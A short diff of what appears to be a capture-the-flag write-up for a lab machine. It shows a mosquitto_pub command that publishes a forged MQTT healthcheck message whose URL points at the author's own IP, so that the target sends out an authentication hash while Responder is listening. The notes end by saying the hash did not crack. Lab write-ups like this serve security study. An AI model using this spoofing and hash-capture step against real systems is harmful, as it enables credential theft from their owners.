@@ -199,4 +199,7 @@ First ill start responder
 mosquitto_pub -h dc01.ghostlink.htb -p 1883 -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' -m '{"timestamp":"2026-30-09-15:35:50","node":"node-6","telemetry":{"healthy":true,"url":"10.10.14.61/healthcheck","lastCheckSecAgo":12,"responseCode":"200","ip":"172.16.20.10"}}' -r
 ```
 
-Ill use the exact same message from before, all ill ch
+Ill use the exact same message from before, all ill change is the URL by putting my IP in there
+
+The hash did not crack
+
